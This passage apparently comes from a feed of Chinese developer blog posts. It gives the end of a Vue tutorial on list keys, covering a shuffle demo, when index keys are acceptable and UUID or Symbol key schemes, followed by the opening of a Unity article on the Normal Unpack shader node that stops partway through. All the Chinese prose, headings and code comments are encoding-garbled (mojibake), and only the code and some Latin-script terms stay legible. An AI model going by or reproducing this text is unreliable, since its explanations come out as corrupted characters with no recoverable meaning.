Â Â Â Â <span class="hljs-comment">//Â ç”ŸæˆÂ 1000Â æ¡æµ‹è¯•æ•°æ®</span>
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateTestData</span>(<span class="hljs-number">1000</span>)
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">generateTestData</span>(<span class="hljs-params">count</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â fruitsÂ =Â [<span class="hljs-string">'è‹¹æœ'</span>,Â <span class="hljs-string">'é¦™è•‰'</span>,Â <span class="hljs-string">'æ©™å­'</span>,Â <span class="hljs-string">'è‘¡è„'</span>,Â <span class="hljs-string">'è¥¿ç“œ'</span>,Â <span class="hljs-string">'è è'</span>,Â <span class="hljs-string">'èŠ’æœ'</span>]
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({Â <span class="hljs-attr">length</span>:Â countÂ },Â <span class="hljs-function">(<span class="hljs-params">_,Â i</span>)Â =&gt;</span>Â ({
Â Â Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â iÂ +Â <span class="hljs-number">1</span>,
Â Â Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">`<span class="hljs-subst">${fruits[iÂ %Â fruits.length]}</span><span class="hljs-subst">${iÂ +Â <span class="hljs-number">1</span>}</span>`</span>,
Â Â Â Â Â Â Â Â <span class="hljs-attr">remark</span>:Â <span class="hljs-string">''</span>
Â Â Â Â Â Â }))
Â Â Â Â },
Â Â Â Â 
Â Â Â Â <span class="hljs-title function_">shuffleItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â startTimeÂ =Â performance.<span class="hljs-title function_">now</span>()
Â Â Â Â Â Â 
Â Â Â Â Â Â <span class="hljs-comment">//Â Fisher-YatesÂ æ´—ç‰Œç®—æ³•</span>
Â Â Â Â Â Â <span class="hljs-keyword">for</span>Â (<span class="hljs-keyword">let</span>Â iÂ =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>Â -Â <span class="hljs-number">1</span>;Â iÂ &gt;Â <span class="hljs-number">0</span>;Â i--)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â jÂ =Â <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()Â *Â (iÂ +Â <span class="hljs-number">1</span>))
Â Â Â Â Â Â Â Â ;[<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[i],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[j]]Â =Â [<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[j],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[i]]
Â Â Â Â Â Â }
Â Â Â Â Â Â 
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">()Â =&gt;</span>Â {
Â Â Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">operationTime</span>Â =Â performance.<span class="hljs-title function_">now</span>()Â -Â startTime
Â Â Â Â Â Â })
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-13">äº”ã€ç‰¹æ®Šæƒ…å†µä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-14">5.1 ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨ä¸‹æ ‡ä½œä¸º keyï¼Ÿ</h3>
<p>è™½ç„¶ä¸€èˆ¬ä¸æ¨èï¼Œä½†åœ¨æŸäº›ç‰¹å®šåœºæ™¯ä¸‹ï¼Œä½¿ç”¨ä¸‹æ ‡ä½œä¸º key æ˜¯å¯ä»¥æ¥å—çš„ï¼š</p>
<ol>
<li>1.Â <strong>é™æ€åˆ—è¡¨</strong>ï¼šåˆ—è¡¨æ°¸è¿œä¸ä¼šæ”¹å˜ï¼ˆå¢åˆ æ”¹æ’åºï¼‰</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â å›ºå®šçš„å¯¼èˆªèœå•Â --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">a</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ fixedNavItems"</span>Â 
Â Â Â Â Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
Â Â Â Â Â <span class="hljs-attr">:href</span>=<span class="hljs-string">"item.link"</span>&gt;</span>
Â Â Â Â {{Â item.textÂ }}
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
</code></pre>
<ol>
<li>2.Â <strong>çº¯å±•ç¤ºæ— çŠ¶æ€</strong>ï¼šåˆ—è¡¨é¡¹æ²¡æœ‰å†…éƒ¨çŠ¶æ€ï¼Œæ²¡æœ‰è¡¨å•å…ƒç´ </li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â åªè¯»çš„ç»Ÿè®¡æ•°æ®å±•ç¤ºÂ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(stat,Â index)Â inÂ statistics"</span>Â 
Â Â Â Â Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
Â Â Â Â Â <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>Â <span class="hljs-attr">class</span>=<span class="hljs-string">"label"</span>&gt;</span>{{Â stat.labelÂ }}:<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>Â <span class="hljs-attr">class</span>=<span class="hljs-string">"value"</span>&gt;</span>{{Â stat.valueÂ }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">5.2 æœ€ä½³å®è·µæŒ‡å—</h3>
<ol>
<li>1.Â <strong>ä¼˜å…ˆä½¿ç”¨å”¯ä¸€æ ‡è¯†ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-bash" lang="bash">//Â ä»åç«¯è·å–çš„æ•°æ®é€šå¸¸æœ‰Â <span class="hljs-built_in">id</span>
:key=<span class="hljs-string">"item.id"</span>

//Â æ²¡æœ‰Â <span class="hljs-built_in">id</span>Â æ—¶å¯ä»¥ç”Ÿæˆ
:key=<span class="hljs-string">"`<span class="hljs-variable">${item.type}</span>-<span class="hljs-variable">${item.timestamp}</span>`"</span>
</code></pre>
<ol>
<li>2.Â <strong>å¤æ‚åœºæ™¯çš„ key ç”Ÿæˆç­–ç•¥</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">computed</span>:Â {
Â Â <span class="hljs-title function_">itemsWithKey</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â Â Â ...item,
Â Â Â Â Â Â <span class="hljs-comment">//Â ç»„åˆå¤šä¸ªå­—æ®µç”Ÿæˆå”¯ä¸€Â key</span>
Â Â Â Â Â Â <span class="hljs-attr">compositeKey</span>:Â <span class="hljs-string">`<span class="hljs-subst">${item.<span class="hljs-keyword">type</span>}</span>-<span class="hljs-subst">${item.category}</span>-<span class="hljs-subst">${item.createTime}</span>`</span>
Â Â Â Â }))
Â Â }
}
</code></pre>
<ol>
<li>3.Â <strong>é¿å…çš„å¸¸è§é”™è¯¯</strong></li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨å¯èƒ½é‡å¤çš„å€¼</span>
:key=<span class="hljs-string">"item.name"</span>Â Â <span class="hljs-comment">//Â åç§°å¯èƒ½é‡å¤</span>

<span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨ä¸ç¨³å®šçš„å€¼</span>
:key=<span class="hljs-string">"Math.random()"</span>Â Â <span class="hljs-comment">//Â æ¯æ¬¡æ¸²æŸ“éƒ½ä¸åŒï¼Œå®Œå…¨å¤±å»å¤ç”¨æ„ä¹‰</span>

<span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨å¯èƒ½å˜åŒ–çš„å€¼</span>
:key=<span class="hljs-string">"item.index"</span>Â Â <span class="hljs-comment">//Â å¦‚æœÂ itemÂ çš„å±æ€§ä¼šå˜åŒ–</span>
</code></pre>
<h3 data-id="heading-16">5.3 å®æˆ˜ä¸­çš„ key ç®¡ç†æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â æ–¹æ¡ˆ1ï¼šä½¿ç”¨Â SymbolÂ ç¡®ä¿å”¯ä¸€æ€§</span>
<span class="hljs-title function_">generateItems</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-keyword">return</span>Â dataFromAPI.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â ...item,
Â Â Â Â <span class="hljs-attr">uniqueKey</span>:Â <span class="hljs-title class_">Symbol</span>()
Â Â }))
}

<span class="hljs-comment">//Â æ–¹æ¡ˆ2ï¼šä½¿ç”¨Â UUID</span>
<span class="hljs-keyword">import</span>Â {Â v4Â <span class="hljs-keyword">as</span>Â uuidv4Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'uuid'</span>

<span class="hljs-title function_">created</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">initialItems</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â ...item,
Â Â Â Â <span class="hljs-attr">uuid</span>:Â item.<span class="hljs-property">uuid</span>Â ||Â <span class="hljs-title function_">uuidv4</span>()
Â Â }))
}

<span class="hljs-comment">//Â æ–¹æ¡ˆ3ï¼šç»´æŠ¤ä¸€ä¸ªè‡ªå¢Â ID</span>
<span class="hljs-keyword">let</span>Â globalIdÂ =Â <span class="hljs-number">0</span>

<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â []
Â Â Â Â }
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">addItem</span>(<span class="hljs-params">newItem</span>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>({
Â Â Â Â Â Â Â Â ...newItem,
Â Â Â Â Â Â Â Â <span class="hljs-attr">localId</span>:Â ++globalIdÂ Â <span class="hljs-comment">//Â æœ¬åœ°ç”Ÿæˆçš„å”¯ä¸€ID</span>
Â Â Â Â Â Â })
Â Â Â Â }
Â Â }
}
</code></pre>
<h2 data-id="heading-17">å…­ã€Vue 3 ä¸­çš„å˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-18">6.1 Vue 3 çš„ä¼˜åŒ–</h3>
<p>Vue 3 åœ¨è™šæ‹Ÿ DOM çš„ Diff ç®—æ³•ä¸Šåšäº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œä½† key çš„é‡è¦æ€§ä¾ç„¶ä¸å˜ã€‚Vue 3 å¼•å…¥çš„Â <code>Fragment</code>Â å’ŒÂ <code>Teleport</code>Â ç­‰ç‰¹æ€§ï¼Œä½¿å¾—æ­£ç¡®çš„ key ä½¿ç”¨æ›´åŠ é‡è¦ã€‚</p>
<h3 data-id="heading-19">6.2 Composition API ä¸­çš„åˆ—è¡¨æ¸²æŸ“</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â {{Â item.nameÂ }}
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>Â <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span>Â {Â refÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span>Â itemsÂ =Â <span class="hljs-title function_">ref</span>([
Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'Apple'</span>Â },
Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'Banana'</span>Â }
])

<span class="hljs-comment">//Â æ·»åŠ æ–°é¡¹ç›®</span>
<span class="hljs-keyword">const</span>Â <span class="hljs-title function_">addItem</span>Â =Â (<span class="hljs-params"/>)Â =&gt;Â {
Â Â items.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({
Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),Â <span class="hljs-comment">//Â ä½¿ç”¨æ—¶é—´æˆ³ä½œä¸ºå”¯ä¸€ID</span>
Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'NewÂ Fruit'</span>
Â Â })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-20">ä¸ƒã€æ€»ç»“</h2>
<h3 data-id="heading-21">å…³é”®è¦ç‚¹å›é¡¾</h3>
<ol>
<li>1.Â <strong>key çš„ä½œç”¨</strong>ï¼šå¸®åŠ© Vue è¯†åˆ«èŠ‚ç‚¹ï¼Œå®ç°é«˜æ•ˆçš„ DOM æ›´æ–°</li>
<li>2.Â <strong>ä¸‹æ ‡ä½œä¸º key çš„é—®é¢˜</strong>ï¼š</li>
<li>
<ul>
<li>â€¢ åˆ—è¡¨é¡ºåºå˜åŒ–æ—¶å¯¼è‡´çŠ¶æ€é”™ä¹±</li>
<li>â€¢ æ€§èƒ½ä¸‹é™ï¼ˆä¸å¿…è¦çš„ DOM æ“ä½œï¼‰</li>
<li>â€¢ ç”¨æˆ·ä½“éªŒé—®é¢˜ï¼ˆå¦‚è¡¨å•è¾“å…¥é”™ä½ï¼‰</li>
</ul>
</li>
<li>3.Â <strong>æ­£ç¡®ä½¿ç”¨ key çš„å¥½å¤„</strong>ï¼š</li>
<li>
<ul>
<li>â€¢ å‡†ç¡®å¤ç”¨ DOM èŠ‚ç‚¹</li>
<li>â€¢ ä¿æŒç»„ä»¶çŠ¶æ€</li>
<li>â€¢ æå‡æ¸²æŸ“æ€§èƒ½</li>
</ul>
</li>
</ol>
<h3 data-id="heading-22">å®æˆ˜å»ºè®®</h3>
<ol>
<li>1.Â <strong>é»˜è®¤ä½¿ç”¨å”¯ä¸€æ ‡è¯†ç¬¦</strong>ä½œä¸º key</li>
<li>2.Â <strong>å¦‚æœæ•°æ®æ²¡æœ‰å”¯ä¸€æ ‡è¯†</strong>ï¼Œåœ¨è·å–æ•°æ®æ—¶æ·»åŠ </li>
<li>3.Â <strong>é™æ€åˆ—è¡¨</strong>å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸‹æ ‡ï¼Œä½†è¦æ˜ç¡®æ ‡æ³¨åŸå› </li>
<li>4.Â <strong>å§‹ç»ˆè€ƒè™‘åˆ—è¡¨å¯èƒ½çš„å˜åŒ–</strong>ï¼ˆæ’åºã€è¿‡æ»¤ã€åˆ†é¡µç­‰ï¼‰</li>
</ol>
<h3 data-id="heading-23">æœ€åçš„æ€è€ƒ</h3>
<p>åœ¨ Vue å¼€å‘ä¸­ï¼Œkey çš„æ­£ç¡®ä½¿ç”¨æ˜¯ä¼˜åŒ–æ€§èƒ½ã€ç¡®ä¿æ­£ç¡®æ€§çš„é‡è¦ä¸€ç¯ã€‚è™½ç„¶ä½¿ç”¨ä¸‹æ ‡ä½œä¸º key çœ‹èµ·æ¥æ–¹ä¾¿ï¼Œä½†æ½œåœ¨çš„é—®é¢˜å¯èƒ½ä¼šåœ¨åç»­å¼€å‘ä¸­é€ æˆæ›´å¤§çš„éº»çƒ¦ã€‚</p>
<p>è®°ä½ï¼š<strong>å¥½çš„ key åº”è¯¥æ˜¯ç¨³å®šã€å”¯ä¸€ä¸”å¯é¢„æµ‹çš„</strong>ã€‚èŠ±ä¸€ç‚¹æ—¶é—´ä¸ºåˆ—è¡¨é¡¹é€‰æ‹©åˆé€‚çš„ keyï¼Œå¯ä»¥é¿å…è®¸å¤šéš¾ä»¥è°ƒè¯•çš„é—®é¢˜ï¼Œå¹¶æå‡åº”ç”¨çš„æ•´ä½“æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨]]></title>    <link>https://juejin.cn/post/7592759902675337262</link>    <guid>https://juejin.cn/post/7592759902675337262</guid>    <pubDate>2026-01-08T01:53:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759902675337262" data-draft-id="7592759902675255342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨"/> <meta itemprop="keywords" content="æ¸¸æˆå¼€å‘,å›¾å½¢å­¦,Unity3D"/> <meta itemprop="datePublished" content="2026-01-08T01:53:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:53:32.000Z" title="Thu Jan 08 2026 01:53:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong></p>
</blockquote>
<h2 data-id="heading-0">æ ¸å¿ƒåŠŸèƒ½æ¦‚è¿°</h2>
<p>æ³•çº¿è§£åŒ…èŠ‚ç‚¹ï¼ˆNormal Unpack Nodeï¼‰æ˜¯Unity URPæ¸²æŸ“ç®¡çº¿ä¸­å¤„ç†æ³•çº¿è´´å›¾æ•°æ®çš„æ ¸å¿ƒç»„ä»¶ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯<strong>å¯¹å‹ç¼©å­˜å‚¨çš„æ³•çº¿å‘é‡</strong>è¿›è¡Œè§£å‹ç¼©è½¬æ¢ã€‚è¯¥èŠ‚ç‚¹é€šè¿‡ç‰¹å®šç®—æ³•å°†çº¹ç†é‡‡æ ·ç»“æœä¸­çš„å‹ç¼©æ³•çº¿æ•°æ®è¿˜åŸä¸ºç¬¦åˆæ¸²æŸ“ç®¡çº¿è¦æ±‚çš„3Då‘é‡ï¼Œæœ‰æ•ˆè§£å†³ç›´æ¥é‡‡æ ·æ³•çº¿è´´å›¾æ—¶å¯èƒ½å‡ºç°çš„æ ¼å¼å…¼å®¹æ€§é—®é¢˜ã€‚</p>
<h3 data-id="heading-1">æŠ€æœ¯ä»·å€¼</h3>
<ul>
<li><strong>æ ¼å¼å…¼å®¹æ€§</strong>ï¼šè‡ªåŠ¨å¤„ç†RGï¼ˆçº¢ç»¿é€šé“ï¼‰æˆ–RGBï¼ˆå…¨é€šé“ï¼‰å­˜å‚¨çš„æ³•çº¿è´´å›¾æ ¼å¼</li>
<li><strong>ç©ºé—´è½¬æ¢</strong>ï¼šæ”¯æŒåˆ‡çº¿ç©ºé—´ï¼ˆTangent Spaceï¼‰å’Œå¯¹è±¡ç©ºé—´ï¼ˆObject Spaceï¼‰ä¸¤ç§è¾“å‡ºæ¨¡å¼</li>
<li><strong>é”™è¯¯è¡¥æ•‘</strong>ï¼šåœ¨æ³•çº¿è´´å›¾ç±»å‹è®¾ç½®é”™è¯¯æ—¶æä¾›æ•°æ®æ¢å¤æ–¹æ¡ˆ</li>
</ul>
<h2 data-id="heading-2">ç«¯å£ä¸å‚æ•°è¯¦è§£</h2>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/NormalUnpackNodeThumb.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">ç«¯å£é…ç½®</h3>
<p>æ³•çº¿è§£åŒ…èŠ‚ç‚¹åŒ…å«ä¸¤ä¸ªæ ¸å¿ƒç«¯å£ï¼š</p>
<ul>
<li><strong>è¾“å…¥ç«¯å£ï¼ˆInï¼‰</strong>ï¼šæ¥æ”¶é‡‡æ ·åçš„çº¹ç†æ•°æ®ï¼ˆVector4ç±»å‹ï¼‰ï¼ŒåŒ…å«RGBAå››ä¸ªé€šé“å€¼</li>
<li><strong>è¾“å‡ºç«¯å£ï¼ˆOutï¼‰</strong>ï¼šè¾“å‡ºè½¬æ¢åçš„æ³•çº¿å‘é‡ï¼ˆVector3ç±»å‹ï¼‰ï¼ŒåŒ…å«XYZä¸‰ä¸ªåˆ†é‡</li>
</ul>
<h3 data-id="heading-4">æ§åˆ¶å‚æ•°</h3>
